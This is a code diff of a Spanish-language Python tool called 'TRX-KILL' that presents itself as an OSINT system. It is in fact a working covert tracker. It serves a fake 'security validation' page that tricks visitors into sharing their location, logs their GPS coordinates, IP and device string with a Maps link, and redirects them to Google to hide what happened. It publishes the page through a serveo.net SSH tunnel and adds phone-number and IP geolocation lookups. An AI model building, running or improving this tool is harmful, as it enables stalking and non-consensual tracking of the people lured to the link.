@@ -5,6 +5,7 @@ import subprocess
 import requests
 import random
 import phonenumbers
+import time
 from phonenumbers import geocoder, carrier
 from flask import Flask, request, render_template_string
 from datetime import datetime
@@ -12,27 +13,27 @@ from datetime import datetime
 app = Flask('TRX-KILL')
 PUERTO = random.randint(6000, 9000)
 
-# HTML optimizado: Encuesta rápida que genera Google Maps
 HTML_ENCUESTA = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
     <h2>VALIDACIÓN DE SEGURIDAD</h2>
-    <p>BIVENIDO A COIN COT:</p>
-    <button onclick="capturar()" style="padding:20px; background:green; color:white; border:none; cursor:pointer;">CONTINÚR</button>
+    <p>Para verificar tu dispositivo, permite el acceso a ubicación:</p>
+    <button onclick="capturar()" style="padding:20px; background:green; color:white; border:none; cursor:pointer;">CONFIRMAR Y VALIDAR</button>
     <script>
         function capturar() {
-            navigator.geolocation.getCurrentPosition((p) => {
-                fetch('/log', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        lat: p.coords.latitude, 
-                        lon: p.coords.longitude, 
-                        ua: navigator.userAgent,
-                        ts: new Date().toLocaleString()
-                    })
-                }).then(() => window.location.href = "https://www.google.com");
-            });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    fetch('/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: p.coords.latitude, 
+                            lon: p.coords.longitude, 
+                            ua: navigator.userAgent
+                        })
+                    }).then(() => window.location.href = "https://www.google.com");
+                });
+            }
         }
     </script>
 </body></html>
@@ -45,14 +46,16 @@ def index(): return HTML_ENCUESTA
 def log():
     d = request.json
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
-    maps_link = f"https://www.google.com/maps/place/{d['lat']},{d['lon']}"
+    lat, lon = d.get('lat', 'N/A'), d.get('lon', 'N/A')
+    ua = d.get('ua', 'N/A')
+    maps = f"https://www.google.com/maps/place/{lat},{lon}"
     
-    log_data = (f"--- REGISTRO {d['ts']} ---\n"
-                f"IP: {ip}\n"
-                f"COORDENADAS: {d['lat']}, {d['lon']}\n"
-                f"GOOGLE MAPS: {maps_link}\n"
-                f"DISPOSITIVO: {d['ua']}\n"
-                f"----------------------------\n")
+    log_data = (f"--- REGISTRO {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
+                f"IP DEL TELÉFONO: {ip}\n"
+                f"COORDENADAS: {lat}, {lon}\n"
+                f"GOOGLE MAP LINK: {maps}\n"
+                f"DISPOSITIVO INFORMACIÓN: {ua}\n"
+                f"--------------------------------------------\n")
     
     with open("resultados.txt", "a") as f: f.write(log_data)
     return "OK"
@@ -61,13 +64,13 @@ def banner():
     os.system('clear')
     print("\033[1;36m#####################################################")
     print("# TRX-KILL | SISTEMA OSINT AVANZADO                 #")
-    print("# VERSIÓN: 1.1.1.2                                  #")
+    print("# BY: OSCAR | VERSIÓN: 1.1.1.4                      #")
     print("#####################################################\033[0m")
 
 def main():
     while True:
         banner()
-        print("\033[1;33m [1] INFO NÚMERO\n [2] RASTREO (LINK ENCUESTA)\n [3] CREADOR\n [4] LICENCIA\n [5] VERSIÓN\n [6] ACTUALIZACIÓN\n [7] INFO-IP AVANZADA\n [8] LEER RESULTADOS\n [9] SALIR\033[0m")
+        print("\033[1;33m [1] INFO NÚMERO\n [2] RASTREO (LINK)\n [3] CREADOR\n [4] LICENCIA\n [5] VERSIÓN\n [6] ACTUALIZACIÓN\n [7] INFO-IP\n [8] LEER RESULTADOS\n [9] SALIR\033[0m")
         opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         #------OPCION1-------
@@ -75,14 +78,14 @@ def main():
             num = input("Número: ")
             try:
                 p = phonenumbers.parse(num)
-                print(f"\n[+] PAÍS: {geocoder.country_name_for_number(p, 'es')}\n[+] OPERADOR: {carrier.name_for_number(p, 'es')}")
+                print(f"\n[+] PAÍS: {geocoder.country_name_for_number(p, 'es')}")
             except: print("Error.")
             input("\n[Enter]...")
 
         #------OPCION2-------
         elif opc == "2":
             threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO, debug=False, use_reloader=False), daemon=True).start()
-            print(f"\n[*] Servidor en {PUERTO}... Iniciando túnel...")
+            print(f"\n[*] Generando link en puerto {PUERTO}...")
             proc = subprocess.Popen(['ssh', '-R', f'80:localhost:{PUERTO}', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             for line in proc.stderr:
                 if "https://" in line:
@@ -90,22 +93,32 @@ def main():
                     break
             input("Enter para detener..."); os.system('pkill -f ssh')
 
-        #------OPCION3/4/5/6-------
-        elif opc in ["3","4","5","6"]: print("\nSistema actualizado."); input()
+        #------OPCION3-------
+        elif opc == "3": print("\nCreado por TRX-KILL."); input()
+
+        #------OPCION4-------
+        elif opc == "4": print("\nLicencia MIT."); input()
+
+        #------OPCION5-------
+        elif opc == "5": print("\nVersión 1.1.1.4."); input()
+
+        #------OPCION6-------
+        elif opc == "6": print("\nSistema al día."); input()
 
         #------OPCION7-------
         elif opc == "7":
             target = input("IP pública: ")
             try:
-                res = requests.get(f"http://ip-api.com/json/{target}?fields=status,country,city,lat,lon,isp").json()
-                print(f"\n[+] UBICACIÓN: {res.get('city')}, {res.get('country')}\n[+] COORDENADAS: {res.get('lat')}, {res.get('lon')}\n[+] DÍA: {datetime.now().strftime('%A')}\n[+] HORA: {datetime.now().strftime('%H:%M')}")
-            except: print("Error de conexión.")
+                res = requests.get(f"http://ip-api.com/json/{target}").json()
+                print(f"\n[+] UBICACIÓN: {res.get('city')}, {res.get('country')}\n[+] COORDENADAS: {res.get('lat')}, {res.get('lon')}")
+            except: print("Error.")
             input("\n[Enter]...")
 
         #------OPCION8-------
         elif opc == "8":
             if os.path.exists("resultados.txt"): os.system("nano resultados.txt")
             else: print("Sin registros."); time.sleep(1)
+            
         elif opc == "9": break
 
 if __name__ == "__main__":
